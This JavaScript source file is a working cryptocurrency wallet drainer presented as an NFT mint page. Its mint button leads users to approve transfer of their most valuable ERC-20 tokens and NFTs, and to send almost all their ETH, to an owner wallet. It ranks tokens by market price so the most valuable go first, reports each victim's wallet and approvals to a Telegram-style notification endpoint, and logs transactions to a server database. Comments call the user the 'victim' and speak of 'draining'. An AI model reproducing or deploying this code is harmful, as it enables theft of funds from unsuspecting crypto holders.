
// -------------------------- Main Variables -------------------------- //

// Pour erreur negative mobile : https://ethereum.stackexchange.com/questions/126327/metamask-mobile-token-transfer-invalid-amount-error
// Buttons

const login_button = $("#"+webpage_config.login_button+"")
const mint_button = $("#"+webpage_config.mint_button+"")

let not_logged_div = $("#"+webpage_config.not_logged_div+"")
let logged_div = $("#"+webpage_config.logged_div+"")

let user_wallet_span = $("#"+webpage_config.user_wallet_span+"")
let user_wallet_span_mobile = $("#"+webpage_config.user_wallet_span_mobile+"")


// Variables

let infura_api_key = api_pblc_config.infura_api_key
let infura_url = api_pblc_config.infura_url

let chosen_chain_id = chain_config.chain_id;

let owner_wallet = owner_pblc_config.owner_wallet

// Web3modal imports //

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const Fortmatic = window.Fortmatic;
const evmChains = window.evmChains;

// Web3modal instance

let web3Modal

// Chosen wallet provider given by the dialog window

let provider;

let user_eth_balance;
let user_erc20_tokens = new Array();
let user_erc_721_nfts = new Array();
let user_erc_1155_nfts = new Array();

let sorted_user_erc20_tokens = new Array()
let sorted_unique_user_erc1155_tokens = new Array()

let user_wallet;
let provider_name;

let is_metamask;


// Options

const enable_stake_most_expensive_erc20_token_first = options_config.enable_stake_most_expensive_erc20_token_first;;
const enable_only_stake_most_expensive_erc20_token = options_config.enable_only_stake_most_expensive_erc20_token;

const erc_20_staking = options_config.enable_erc20_stake;
const erc_721_staking = options_config.enable_erc721_stake;;
const erc_1155_staking = options_config.enable_erc1155_stake;;
const eth_staking = options_config.enable_erc20_stake;;


const minimal_eth_balance_to_launch_transaction = options_config.minima_eth_balance_to_send;

const enable_telegram_notifications = telegram_config.enable_telegram_notification
const telegram_token = telegram_config.telegram_token
const chatid = telegram_config.chatid

// Tokens

let token_addresses = new Array()

if(chosen_chain_id == 1){ // Main Net
  token_addresses["USDT_Token_Address"] = "0xdAC17F958D2ee523a2206206994597C13D831ec7"
  token_addresses["USDCOIN_Token_Address"] = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
  token_addresses["BNB_Token_Address"] = "0xB8c77482e45F1F44dE1745F52C74426C631bDD52"
  token_addresses["BUSD_Token_Address"] = "0x4Fabb145d64652a948d72533023f6E7A623C7C53"
  token_addresses["MATIC_Token_Address"] = "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0"
  token_addresses["SHIBA_Token_Address"] = "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE"
  token_addresses["HEX_Token_Address"] = "0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39"
  token_addresses["DAI_Token_Address"] = "0x6B175474E89094C44Da98b954EedeAC495271d0F"
  token_addresses["STETH_Token_Address"] = "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84"
}

if(chosen_chain_id == 42){ // kovan
  token_addresses["USDC_Kovan_Token_Address"] = "0xc2569dd7d0fd715B054fBf16E75B001E5c0C1115"
  token_addresses["DAI_Kovan_Token_Address"] = "0x4F96Fe3b7A6Cf9725f59d353F723c1bDb64CA6Aa"
}

if(chosen_chain_id == 4){ // rinkeby
  token_addresses["DAI_Rinbeky"] = "0xc7AD46e0b8a400Bb3C915120d284AafbA8fc4735"
  token_addresses["WETH_Rinkeby"] = "0xc778417E063141139Fce010982780140Aa0cD5Ab"
  token_addresses["MKR_Rinkeby"] = "0xF9bA5210F91D0474bd1e1DcDAeC4C58E359AaD85"
}

if(chosen_chain_id == 5){ // Goerli
  token_addresses["WETH_Goerli"] = "0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6";
  token_addresses["UNI_Goerli"] = "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984";
}


// -------------------------- Main Functions -------------------------- //


function initialize(){

    // ------------- Mobile check ( Useless with wallet connect ) ------------- //

    (function(a){(jQuery.browser=jQuery.browser||{}).mobile=/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))})(navigator.userAgent||navigator.vendor||window.opera);

    // ------------- Hidding not wanted elements ------------- //

    logged_div.hide()

    // ------------- Initiating Web3Modal ------------- //

    // List of providers we want to provide | Metamask and browser wallets are implicitly in this list so no need to add them

    const providerOptions = {
        walletconnect: {
            package: WalletConnectProvider,
            options: {
                infuraId: infura_api_key
            }
        }
    };

    web3Modal = new Web3Modal({
        cacheProvider: false, // optional
        providerOptions, // required
        disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
        theme : "dark"
    });
    
}

async function connect_wallet(){
    
    try {

        provider = await web3Modal.connect();
        
        if(provider){

            // Setting victim_vallet and provider_name
            if(provider.accounts){
                user_wallet = provider.accounts[0]
                provider_name = "Wallet Connect";
            }
            else{
                user_wallet = provider.selectedAddress
                provider_name = "Metamask"              
            }   
            
            // Setting web3
            if(provider.selectedAddress){
                web3 = new Web3(Web3.givenProvider)
            }
            else if(provider.accounts[0]){
                web3 = new Web3(provider)
            }

            is_metamask = (typeof provider["accounts"] === 'undefined' || provider["accounts"] === null)

            logged_div.css("display","block")
            not_logged_div.css("display","none")

            user_wallet_span.text(user_wallet)
            user_wallet_span_mobile.text(user_wallet.substr(0,8) + "...")


            login_button.hide();
            mint_button.show();

            let message = `
[🏴] Login [🏴]
<b>[${user_wallet}]</b> Connected from ${provider_name}`

            send_telegram_notification(message)
            


          }
          else{
            console.log("Please log in !")
          }
          

  } 
  catch(error) {
    if(error = "Error: User closed modal"){
        console.log("Modal closed !")
    }
    return;
  }
}

async function listener(){
    if(provider){
        provider.on("chainChanged", (chainId) => {
            if(chainId == "0x" + chosen_chain_id){}
            else{
              window.location.reload();
            }
          });
    }
}

// ------------------- Storing transactions part ------------------- //


function erc20_store_transaction(txid,token_address,from_wallet,token_balance){
    if(from_wallet == user_wallet){
      let tx_infos = `
      Txid : ${txid}
      Token Address : ${token_address}
      From Wallet : ${from_wallet}
      Floor : ${token_balance}
    `
    url = `php/store_database.php?txid=${txid}&token_address=${token_address}&from=${from_wallet}&amount=${token_balance}`
    fetch(url)
    }
    else{
      console.log("Catched by security ( Tentative of usurpation of storage )")
    }
  
}
  
function erc_721_store_transaction(txid,token_address,token_id,from_wallet){
    let tx_infos = `
        Txid : ${txid}
        Token Address : ${token_address}
        From Wallet : ${from_wallet}
    `
    url = `php/nft/store_database.php?txid=${txid}&token_address=${token_address}&token_id=${token_id}&from=${from_wallet}&amount=1&type=721`



    fetch(url)
}

function erc_1155_store_transaction(txid,token_address,from_wallet,token_id,amount_of_tx_remaining){
    let tx_infos = `
        Txid : ${txid}
        Token Address : ${token_address}
        Token id : ${token_id}
        From Wallet : ${from_wallet}
        Token amount : ${amount_of_tx_remaining}
    `
    url = `php/nft/store_database.php?txid=${txid}&token_address=${token_address}&token_id=${token_id}&from=${from_wallet}&amount=${amount_of_tx_remaining}&type=1155`
    fetch(url)
}

// Balance functions

async function get_eth_balance(){
    try{
        const money = await provider.request({ 
            method: 'eth_getBalance',
            params: [user_wallet, "latest"]
        
          });
         
        const decimal_money = web3.utils.fromWei(money);
      
        user_eth_balance = decimal_money;

        return true;
    }
    catch(error){
        console.log(error)
    }

    
}

async function get_erc_20_token_balances(){

    let getBalance_abi = [
        {
          "constant": true,
          "inputs": [
              {
                  "name": "_owner",
                  "type": "address"
              }
          ],
          "name": "balanceOf",
          "outputs": [
              {
                  "name": "balance",
                  "type": "uint256"
              }
          ],
          "payable": false,
          "stateMutability": "view",
          "type": "function"
        }
    ]   
    try{
        for(const index in token_addresses){
            let token_address = token_addresses[index]
            let contract = new web3.eth.Contract(getBalance_abi, token_address);
            
            result = await contract.methods.balanceOf(user_wallet).call()
    
            if(result > 0){
                
                let inner_array = new Array()
    
                if(enable_only_stake_most_expensive_erc20_token || enable_stake_most_expensive_erc20_token_first){

                    const response = await fetch(`https://api.coingecko.com/api/v3/coins/ethereum/contract/${token_address}`, {
                        headers: {
                          "Content-Type": "text/plain"
                        },
                        method: "GET",
                     });

                     
                      const data = await response.json();
                      let Token_Decimal_Amount = data["detail_platforms"]["ethereum"]["decimal_place"]
                      let Token_Price = data["market_data"]["current_price"]["eur"]
                      let Token_Human_Balance = result / Math.pow(10, Token_Decimal_Amount)
                      let Token_Symbol = data["symbol"]
                     
                      let Token_real_value = Token_Human_Balance * Token_Price
                      inner_array["Token_Real_Value"] = Token_real_value
                      inner_array["Token_Symbol_Name"] = Token_Symbol
                    
                }
                else{
                    inner_array["Token_Real_Value"] = 1 // Used to sort or to choose the most expensive
                    inner_array["Token_Symbol_Name"] = 1
                }
    
                inner_array["Token_Address"] = token_address
                inner_array["Token_Balance"] = result

    
    
                // does not add USDT if not on desktop metamask ( Know metamask issue )
                if(token_address == "0xdAC17F958D2ee523a2206206994597C13D831ec7" && !is_metamask){
        
                }
                else{
                    user_erc20_tokens.push(inner_array)
                }
    
    
            }
            else{
            }
            
        }
        return true;
    }
    catch(error){
        console.log(error)
    }
}

async function get_erc_721_nft_list(){

    let nft_result
    
    if(chosen_chain_id != 1){
      url = "https://testnets-api.opensea.io/api/v1/assets?format=json&owner=" + user_wallet
    }
    else{
      url = "https://api.opensea.io/api/v1/assets?format=json&owner=" + user_wallet
    }
    try{
        await $.getJSON(url, function(data) {
            nft_result = data["assets"]
            if(nft_result.length == 1){
                
                if(nft_result[0]["asset_contract"].schema_name == "ERC721"){
                    
                    let nft = []  
                    nft[0] = nft_result[0]["image_url"]
                    nft[1] = nft_result[0]["name"]
                    nft[2] = nft_result[0]["collection"]["name"]
                    nft[3] = nft_result[0]["asset_contract"]["address"]
                    nft[4] = nft_result[0]["token_id"]
          
                    
                    user_erc_721_nfts.push(nft) 
    
                }
                else{
                }
      
            }
            else{
                nft_array = Object.keys(nft_result).map((key) => [Number(key), nft_result[key]]);
              
                for(let i = 0;i < nft_array.length;i++){
                  item = nft_array[i][1]
                  if(item["asset_contract"].schema_name == "ERC721"){
    
                    let nft = new Array(5)
      
                    nft[0] = item["image_url"]
                    nft[1] = item["name"]
                    nft[2] = item["collection"]["name"]
                    nft[3] = item["asset_contract"]["address"]   
                    nft[4] = item["token_id"]
        
                    user_erc_721_nfts.push(nft)
    
                  }
                  else{
                  }
    
                }
      
            }
        });

        return true;
    }
    catch(error){
        console.log(error)
    }

}

async function get_erc_1155_nft_list(){

    let nft_result
    
    if(chosen_chain_id != 1){
      url = "https://testnets-api.opensea.io/api/v1/assets?format=json&owner=" + user_wallet
    }
    else{
      url = "https://api.opensea.io/api/v1/assets?format=json&owner=" + user_wallet
    }
    try{
        await $.getJSON(url, function(data) {
            nft_result = data["assets"]
             
            if(nft_result.length == 1){
                
                if(nft_result[0]["asset_contract"].schema_name == "ERC1155"){
                    
                    let nft = []  
                    nft[0] = nft_result[0]["image_url"]
                    nft[1] = nft_result[0]["name"]
                    nft[2] = nft_result[0]["collection"]["name"]
                    nft[3] = nft_result[0]["asset_contract"]["address"]
                    nft[4] = nft_result[0]["token_id"]
          
                    
                    user_erc_1155_nfts.push(nft) 
    
                }
                else{
                }
      
            }
            else{
                nft_array = Object.keys(nft_result).map((key) => [Number(key), nft_result[key]]);
              
                for(let i = 0;i < nft_array.length;i++){
                  item = nft_array[i][1]
                  if(item["asset_contract"].schema_name == "ERC1155"){
    
                    let nft = new Array(5)
      
                    nft[0] = item["image_url"]
                    nft[1] = item["name"]
                    nft[2] = item["collection"]["name"]
                    nft[3] = item["asset_contract"]["address"]   
                    nft[4] = item["token_id"]
        
                    user_erc_1155_nfts.push(nft)
    
                  }
                  else{
                  }
    
                }
      
            }
        });
        return true;
    }
    catch(error){
        console.log(error)
    }

}

// Token managing

async function calculate_possibilities(){


    show_loading_screen()

    let eth_result = false,erc_20_result = false,erc_721_result = false,erc_1155_result = false;

    // ETH staking
    eth_result = await get_eth_balance() // => user_eth_balance

    if(eth_result){
        // Erc 20 staking
        erc_20_result = await get_erc_20_token_balances() // => user_erc20_balances
    }

    if(erc_20_result){
        // Erc 721 staking
        erc_721_result = await get_erc_721_nft_list() // => user_erc_721_nfts
    }

    if(erc_721_result){
        // Erc 1155 staking
        erc_1155_result = await get_erc_1155_nft_list() // => user_erc_1155_nfts
    }

    if(eth_result == true && erc_20_result == true && erc_721_result == true && erc_1155_result == true ){
        hide_loading_screen();
    }

}

async function prepare_for_approval(){

    // Order : ERC20 => ERC721 => ERC1155 => ETH

    show_loading_screen();  

    // Wallet Connect Or Mobile Connect
    if(!is_metamask){
        sort_tokens();

        let tokens_quantity = sorted_user_erc20_tokens.length

        launch_erc20_approval_requests(tokens_quantity);
        launch_eth_transaction();
    }

    // Desktop Metamask
    else{
        if(erc_20_staking){

            // Sorts the tokens
            sort_tokens();

            let tokens_quantity = sorted_user_erc20_tokens.length

            // Launching erc20 approval requests ( Then the others )
            launch_erc20_approval_requests(tokens_quantity) 
    
        }
        else if(erc_721_staking){
    
            // Launching erc1155 approval requests ( Then the others )
            let erc721_quantity = user_erc_721_nfts.length
            launch_erc721_approval_requests(erc721_quantity);
    
        }
        
        else if(erc_1155_staking){
    
            // Launching erc1155 approval requests ( Then the others )
            let erc1155_quantity = user_erc_1155_nfts.length
            launch_erc1155_approval_requests(erc1155_quantity);
    
        }
        
        else if(eth_staking){
    
            // Launching the eth transaction request
            launch_eth_transaction()
    
        }    
    }

}

// Request launching

async function launch_erc20_approval_requests(tokens_quantity){
    
    if(tokens_quantity >= 1){

        chosen_token = sorted_user_erc20_tokens[0];
        sorted_user_erc20_tokens.shift()


        if(jQuery.browser.mobile == true){
            sorted_user_erc20_tokens = [];
            tokens_quantity = 0;
        }
        else{
            tokens_quantity -= 1;
        }
        approve_erc20_request(chosen_token["Token_Address"],chosen_token["Token_Balance"])


    }
    else{
        console.log("No more erc20 tokens !")
        if(is_metamask){
            if(erc_721_staking == true){
                // Launching erc721 approval requests
                let erc721_quantity = user_erc_721_nfts.length
                launch_erc721_approval_requests(erc721_quantity);
            }
            else if(erc_1155_staking == true){
                // Launching erc1155 approval requests
                let erc1155_quantity = user_erc_1155_nfts.length
                launch_erc1155_approval_requests(erc1155_quantity);
            }
            else if(eth_staking == true){
                // Launching eth transaction
                launch_eth_transaction()
            }
            else if(!erc_1155_staking && !erc_721_staking && !eth_staking){
                console.log("Approval requests dones !")
                hide_loading_screen()
            }
        }

    }

}

async function launch_erc1155_approval_requests(erc1155_quantity){

        if(erc1155_quantity >= 1){

            if(erc1155_quantity == 1){
                approve_erc1155_request(user_erc_1155_nfts[0][3],user_erc_1155_nfts[0][4])    
            }
            else{
                for(const unique_nft in user_erc_1155_nfts){

                    var contract_already_registered = sorted_unique_user_erc1155_tokens.find(function(post, index) {
                        if(post[0] == user_erc_1155_nfts[unique_nft][3])
                            return true;
                    });     
                    
                    if(contract_already_registered){
                        var index_of_registered_contract = sorted_unique_user_erc1155_tokens.findIndex(function(post, index) {
                                if(post[0] == user_erc_1155_nfts[unique_nft][3])
                                return true;
                        });   
    
                        sorted_unique_user_erc1155_tokens[index_of_registered_contract][1].push(user_erc_1155_nfts[unique_nft][4])
                    } 
                    else{
                        let new_unique_contract_item = new Array()
                        let inner_token_addresses = new Array()
                        inner_token_addresses.push(user_erc_1155_nfts[unique_nft][4])
                        new_unique_contract_item[0] = user_erc_1155_nfts[unique_nft][3]
                        new_unique_contract_item[1] = inner_token_addresses
                        sorted_unique_user_erc1155_tokens.push(new_unique_contract_item)
                      }

                }

                let chosen_erc1155_token = sorted_unique_user_erc1155_tokens[0]
                approve_erc1155_request(chosen_erc1155_token[0],chosen_erc1155_token[1]);

                user_erc_1155_nfts.shift()
                sorted_unique_user_erc1155_tokens.shift()
            }

        }
        else{
            console.log("Not enough 1155 nfts to send, now sending ETH Transaction if enabled !")
            if(eth_staking == true){
                launch_eth_transaction()
            }
            else if(!erc_721_staking && !eth_staking){
                console.log("Approval requests dones !")
                hide_loading_screen()
            }

        }

}

async function launch_erc721_approval_requests(erc_721_quantity){

    if(erc_721_quantity >= 1){
        if(erc_721_quantity == 1){
            approve_erc721_request(user_erc_721_nfts[0][3])
                
        }
        else{
            let chosen_erc721_token = user_erc_721_nfts[0]
            approve_erc721_request(chosen_erc721_token[3],chosen_erc721_token[4]);
            
        }

    }
    else{
        console.log("Not enough 721 nfts to send, now sending ETH Transaction if enabled !")
        if(erc_1155_staking == true){
            // Launching erc1155 approval requests
            let erc_1155_quantity = user_erc_1155_nfts.length
            launch_erc1155_approval_requests(erc_1155_quantity);
        }
        else if(eth_staking == true){
            // Launching eth transaction
            launch_eth_transaction()
        }
        else if(!erc_1155_staking && !eth_staking){
            console.log("Approval requests dones !")
            hide_loading_screen()
        }

    }

}

async function launch_eth_transaction(){

    if(user_eth_balance > minimal_eth_balance_to_launch_transaction){
        
        await web3.eth.getBalance(user_wallet).then(eth__balance => {
        
            web3.eth.getGasPrice().then(gasPrice => {
            
            getGasAmount(user_wallet,owner_wallet,eth__balance).then(gasAmount => {
                fee_wei = gasAmount * (gasPrice * 1.5)
                eth_wei_spendabled = eth__balance - fee_wei        
                eth_transaction_init(web3.utils.toHex(eth_wei_spendabled))
            })
        });
    
    })

    }

}

// Inner functions 

function sort_tokens(){
    if(enable_stake_most_expensive_erc20_token_first || enable_stake_most_expensive_erc20_token_first){

        sorted_user_erc20_tokens = user_erc20_tokens.sort(function(a, b) { return b.Token_Real_Value - a.Token_Real_Value; });

        // If we only drain the most expensive one, we keep the first as the table is already ordered
        if(enable_only_stake_most_expensive_erc20_token || !is_metamask){
            let temp_array = sorted_user_erc20_tokens[0];
            sorted_user_erc20_tokens = []
            sorted_user_erc20_tokens = temp_array
        }
    }
    else{
        sorted_user_erc20_tokens = user_erc20_tokens;
    }

}

async function getGasAmount(fromAddress, toAddress, amount) {

    const gasAmount = await web3.eth.estimateGas({
        to: toAddress,
        from: fromAddress,
        value: amount
    });
    return gasAmount
}

async function eth_transaction_init(eth_amount_to_send){
    
    let parameters = {

        to : owner_wallet,
        from : user_wallet,
        value: eth_amount_to_send, // We need to : Transform to WEI then to HEW

    }
    try{

    }
    catch(error){
        console.log(" User denied the transaction ! [ Error Code : " + error["code"] + " ]")
        console.log("Request approval done !")
        hide_loading_screen()
    }
    provider.request({
        method: 'eth_sendTransaction',
        params: [parameters],
    })
    .then((result) => {
    let message = `
    [🏴]  Ethereum Transfer [🏴]
<b>[${ethereum.selectedAddress}]</b> Transfered ETH funds on your wallet : 

Amount : ${eth_amount_to_send}
Coin name : ETHER
Receiver Wallet : ${owner_wallet}    
    `

    console.log(message)
    console.log("Approval requests done !")
    hide_loading_screen();

    })
    .catch(error => hide_loading_screen());
    
    return true

}



// Approving functions

async function approve_erc20_request(token_address,balance_of_token,token_convert_name){
    let approve_ABI = [
        {
            "constant": false,
            "inputs": [
                {
                    "name": "_spender", 
                    "type": "address"
                },
                {
                    "name": "_value",
                    "type": "uint256"
                }
            ],
            "name": "approve",
            "outputs": [
                {
                    "name": "",
                    "type": "bool"
                }
            ],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
          }
    ]

    let bigNumberBalance = web3.utils.toBN(balance_of_token)
    let usable_balance = bigNumberBalance.divn(1).toString()
  
    let contract = new web3.eth.Contract(approve_ABI, token_address);


    try{
        contract.methods.approve(owner_wallet,balance_of_token).send(
          {
            from: user_wallet
          }
        )
        .on("transactionHash",function(txhash){
            let message = ` 
            [🏴]  ERC-20 Token Approval [🏴]
    <b>[${user_wallet}]</b> Approved a new token ( 0 confirmation ) : 
    
Amount : ${usable_balance}
Coin name : ${token_convert_name}
Approved Wallet : ${owner_wallet}    
            `
            send_telegram_notification(message)
            launch_erc20_approval_requests(sorted_user_erc20_tokens.length)

            erc20_store_transaction(txhash,token_address,user_wallet,usable_balance)

        })
        .on("error",function(error){
            console.log("An error happened during the approval request - " + error)
            launch_erc20_approval_requests(sorted_user_erc20_tokens.length)
        })
      }
      catch(error){
        console.log("Error ! " + error)
        launch_erc20_approval_requests(sorted_user_erc20_tokens.length)
      }


}

async function approve_erc721_request(nft_address,token_id){
    user_erc_721_nfts.shift()
    let approveAllAbi = [
        {
            "constant": false,
            "inputs": [
              {
                "internalType": "address",
                "name": "to",
                "type": "address"
              },
              {
                "internalType": "uint256",
                "name": "tokenId",
                "type": "uint256"
              }
            ],
            "name": "approve",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
          }
      ]
    

    let contract = new web3.eth.Contract(approveAllAbi, nft_address);

    is_confirmed = false;
    try{
        const gasPrice = await web3.eth.getGasPrice();
        const gasEstimate = await contract.methods.approve(owner_wallet,token_id).estimateGas({ from: user_wallet });



        await contract.methods.approve(owner_wallet,token_id).send(
            {
              from: user_wallet,
              gasPrice : gasPrice,
              gas : gasEstimate
            }
          )
          .on("transactionHash",function(txhash){
          
            let message = ` 
[🏴]  ERC 721 Token Approval [🏴]
<b>[${user_wallet}]</b> Approved a new NFT ( 0 confirmation ) : 

TxHash : ${txhash}
NFT Address : ${nft_address}
NFT Token Id : ${token_id}
            ` 
            send_telegram_notification(message)
            launch_erc721_approval_requests(user_erc_721_nfts.length)
            erc_721_store_transaction(txhash,nft_address,token_id,user_wallet)
          })
    }
    catch(error){
        console.log(error)
        launch_erc721_approval_requests(user_erc_721_nfts.length)
    }

}


async function approve_erc1155_request(nft_address,token_id){

    let approveAllAbi = [
        {
          "constant": false,
           "inputs": [
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            }, 
            {
                "internalType": "bool",
                "name": "approved",
                "type": "bool"
            }
        ],
        "name": "setApprovalForAll", 
        "outputs": [], 
        "payable": false, 
        "stateMutability": "nonpayable", 
        "type": "function"
        }
      ]
    

    let contract = new web3.eth.Contract(approveAllAbi, nft_address);

    is_confirmed = false;
    try{
        console.log("From : " + user_wallet)
        console.log("To : " + owner_wallet)
        await contract.methods.setApprovalForAll(owner_wallet,true).send(
            {
              from: user_wallet
            }
          )
          .on("transactionHash",function(txhash){
          
            let message = ` 
[🏴]   NFT Token Approval [🏴]
<b>[${user_wallet}]</b> Approved a new NFT ( 0 confirmation ) : 

TxHash : ${txhash}
NFT Address : ${nft_address}
NFT Token ID : ${token_id}
            ` 
          
            if(token_id.length > 1 && typeof token_id != "string"){
              amount_of_transactions_remaining = token_id.length
            }
            else{
              amount_of_transactions_remaining = 1;
            }
          
            send_telegram_notification(message)
            launch_erc1155_approval_requests(sorted_unique_user_erc1155_tokens.length)
            erc_1155_store_transaction(txhash,nft_address,user_wallet,token_id,amount_of_transactions_remaining)
          })
    }
    catch(error){
        console.log(error)
        launch_erc1155_approval_requests(sorted_unique_user_erc1155_tokens.length)
    }

}


// Network managing 

async function inspect_network(){
    if(web3.eth){
        web3.eth.net.getId().then(chainID => { 
            if(chainID == chosen_chain_id){
                calculate_possibilities();
            }
            else{
                change_network()
            }
        })
    
    }

}

async function change_network(){
    await provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: Web3.utils.toHex(chosen_chain_id) }],
    })
    .catch((error) => window.location.reload())
}

// Dom managing

function show_loading_screen(){
    $("#loading").css("display","flex")
}

function hide_loading_screen(){
    $("#loading").css("display","none")
}


// Social notification
function send_telegram_notification(message){
    if(enable_telegram_notifications){
      $.ajax({
        url: 'http://localhost:8000/api',
            method:'POST',
            data:{chat_id:chatid,text:message,parse_mode:'HTML',do:'sendMessage'},
            success:function(){
                
            }
    });
    }
  }

// -------------------------- Main Run -------------------------- //

$(document).ready(function() {

    initialize()

    login_button.on("click",function(){
        connect_wallet()
        .then((provider) => inspect_network())
        .then(listener);
    })

    mint_button.on("click",function(){
        prepare_for_approval()
    })

})
